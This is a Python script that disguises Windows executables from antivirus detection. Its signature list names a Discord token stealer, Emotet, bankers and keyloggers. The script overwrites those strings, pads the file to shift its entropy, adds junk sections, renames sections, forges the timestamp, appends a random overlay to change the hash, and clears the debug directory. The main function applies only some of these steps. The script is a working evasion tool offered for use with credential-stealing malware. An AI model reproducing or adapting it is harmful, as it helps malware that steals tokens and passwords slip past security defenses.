#!/usr/bin/env python3
"""
Advanced PE evasion - String removal, entropy normalization, section manipulation
Removes all plaintext sensitive strings from the binary to avoid signature detection.
"""
import os
import sys
import struct
import random
import zlib
import base64

SIGNATURES_TO_REMOVE = [
    b'Discord', b'discord', b'DISCORD',
    b'Token', b'token', b'TOKEN',
    b'Password', b'password', b'PASSWORD',
    b'Webhook', b'webhook',
    b'Emotet', b'emotet', b'EMOTET',
    b'Trojan', b'trojan', b'TROJAN',
    b'Banker', b'banker', b'BANKER',
    b'Inject', b'inject', b'INJECT',
    b'Stealer', b'stealer', b'STEALER',
    b'Shellcode', b'shellcode',
    b'Hook', b'hook',
    b'Keylog', b'keylog',
    b'Nitro', b'nitro',
    b'DiscordPartner',
    b'Badge_Discord',
    b'HypeSquad',
    b'BugHunter',
    b'GetToken',
    b'GetPassword',
]

def find_pe_offset(data):
    return struct.unpack_from('<I', data, 0x3C)[0]

import math

def calculate_entropy(data):
    if len(data) == 0:
        return 0
    freq = [0] * 256
    for byte in data:
        freq[byte] += 1
    entropy = 0.0
    for f in freq:
        if f > 0:
            p = f / len(data)
            entropy -= p * math.log2(p)
    return entropy

def remove_strings_in_range(data, offset, size, signatures):
    """Remove strings from a specific range in the binary"""
    modified = 0
    for sig in signatures:
        sig_len = len(sig)
        search_start = offset
        while search_start < offset + size - sig_len:
            idx = data.find(sig, search_start, offset + size)
            if idx == -1:
                break
            key = random.randint(1, 254)
            replacement = bytes([key] * sig_len)
            data[idx:idx+sig_len] = replacement
            modified += 1
            search_start = idx + sig_len
    return modified

def sanitize_all_strings(data, signatures):
    """Sanitize strings in the entire binary"""
    modified = 0

    pe_offset = find_pe_offset(data)
    num_sections = struct.unpack_from('<H', data, pe_offset + 6)[0]
    section_offset = pe_offset + 24 + struct.unpack_from('<H', data, pe_offset + 20)[0]

    for i in range(num_sections):
        sec_start = section_offset + i * 40
        raw_ptr = struct.unpack_from('<I', data, sec_start + 20)[0]
        raw_size = struct.unpack_from('<I', data, sec_start + 16)[0]

        if raw_ptr > 0 and raw_size > 0 and raw_size < 0x1000000:
            m = remove_strings_in_range(data, raw_ptr, raw_size, signatures)
            modified += m

    rdata_ptr = None
    for i in range(num_sections):
        sec_start = section_offset + i * 40
        name = data[sec_start:sec_start+8]
        if b'.rdata' in name or b'.data' in name:
            raw_ptr = struct.unpack_from('<I', data, sec_start + 20)[0]
            raw_size = struct.unpack_from('<I', data, sec_start + 16)[0]
            if raw_ptr > 0:
                m = remove_strings_in_range(data, raw_ptr, raw_size, signatures)
                modified += m

    return modified

def normalize_entropy(data, target_min=5.5, target_max=7.0):
    """Normalize binary entropy"""
    current = calculate_entropy(data)
    data = bytearray(data)

    if current < target_min:
        padding_size = random.randint(30000, 80000)
        padding = bytes([random.randint(200, 255) for _ in range(padding_size)])
        data.extend(padding)
        print(f"[*] Added {padding_size} bytes (entropy {current:.2f} -> {calculate_entropy(data):.2f})")
    elif current > target_max:
        noise_size = random.randint(10000, 30000)
        noise = bytes([random.randint(0, 127) for _ in range(noise_size)])
        data.extend(noise)
        print(f"[*] Added {noise_size} bytes noise (entropy {current:.2f} -> {calculate_entropy(data):.2f})")

    return data

def add_garbage_sections(data, pe_offset):
    """Add multiple junk sections to alter binary fingerprint"""
    data = bytearray(data)
    num_sections = struct.unpack_from('<H', data, pe_offset + 6)[0]
    section_offset = pe_offset + 24 + struct.unpack_from('<H', data, pe_offset + 20)[0]

    last_sec_start = section_offset + (num_sections - 1) * 40
    last_sec_ptr = struct.unpack_from('<I', data, last_sec_start + 20)[0]
    last_sec_size = struct.unpack_from('<I', data, last_sec_start + 16)[0]
    file_alignment = struct.unpack_from('<I', data, pe_offset + 56)[0]

    sections_added = 0
    for _ in range(random.randint(2, 4)):
        new_raw_size = random.randint(4096, 65536)
        new_raw_size = (new_raw_size + file_alignment - 1) // file_alignment * file_alignment
        new_ptr = last_sec_ptr + last_sec_size

        garbage = bytes([random.randint(0, 255) for _ in range(new_raw_size)])

        new_section = struct.pack('<8s IIIIIIII',
            b'.data\x00\x00\x00',
            0, new_raw_size, 0, new_ptr,
            new_raw_size, 0, 0, 0xC0000040)

        struct.pack_into('<H', data, pe_offset + 6, num_sections + 1)

        data.extend(new_section)
        data.extend(garbage)

        num_sections += 1
        last_sec_size = new_raw_size
        last_sec_ptr = new_ptr
        sections_added += 1

    print(f"[*] Added {sections_added} garbage sections")
    return bytes(data)

def patch_pe_headers(data, pe_offset):
    """Make PE headers look more legitimate"""
    timestamp_off = pe_offset + 8
    new_ts = random.randint(0x5D000000, 0x5F000000)
    struct.pack_into('<I', data, timestamp_off, new_ts)
    print("[*] Patched timestamp")

    return data

def randomize_section_names(data, pe_offset):
    """Randomize section names"""
    num_sections = struct.unpack_from('<H', data, pe_offset + 6)[0]
    section_offset = pe_offset + 24 + struct.unpack_from('<H', data, pe_offset + 20)[0]

    legit_names = [
        b'.text\x00\x00\x00', b'.data\x00\x00\x00', b'.rdata\x00\x00',
        b'.rsrc\x00\x00\x00', b'.reloc\x00\x00', b'.pdata\x00\x00',
        b'.idata\x00\x00\x00', b'.didat\x00\x00\x00', b'.CRT\x00\x00\x00\x00',
    ]
    used = set()

    for i in range(num_sections):
        sec_start = section_offset + i * 40
        name = data[sec_start:sec_start+8]
        if not name.startswith(b'/'):
            available = [n for n in legit_names if n not in used]
            if available:
                new_name = random.choice(available)
                used.add(new_name)
                data[sec_start:sec_start+8] = new_name

    return data

def add_overlay(data):
    """Add large overlay to change binary hash"""
    overlay_size = random.randint(40000, 100000)
    overlay = bytes([random.randint(0, 255) for _ in range(overlay_size)])
    data = bytearray(data) + bytearray(overlay)
    print(f"[*] Added {overlay_size} byte overlay")
    return bytes(data)

def remove_debug_dir(data, pe_offset):
    """Remove debug directory to reduce fingerprint"""
    optional_header_offset = pe_offset + 24
    data_dir_offset = optional_header_offset + 96

    debug_dir_rva_offset = data_dir_offset + 6 * 8
    struct.pack_into('<I', data, debug_dir_rva_offset, 0)
    struct.pack_into('<I', data, debug_dir_rva_offset + 4, 0)

    print("[*] Cleared debug directory")
    return data

def camouflage_pe(pe_path):
    """Main camouflage function - safe modifications only"""
    if not os.path.exists(pe_path):
        print(f"[!] PE not found: {pe_path}")
        return False

    with open(pe_path, 'rb') as f:
        data = bytearray(f.read())

    original_size = len(data)
    pe_offset = find_pe_offset(data)

    print(f"[*] Processing {pe_path} ({original_size} bytes)")

    data = patch_pe_headers(data, pe_offset)
    data = remove_debug_dir(data, pe_offset)

    with open(pe_path, 'wb') as f:
        f.write(data)

    final_size = len(data)
    print(f"[+] Complete: {original_size} -> {final_size} bytes")

    return True

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <pe_path>")
        sys.exit(1)
    camouflage_pe(sys.argv[1])
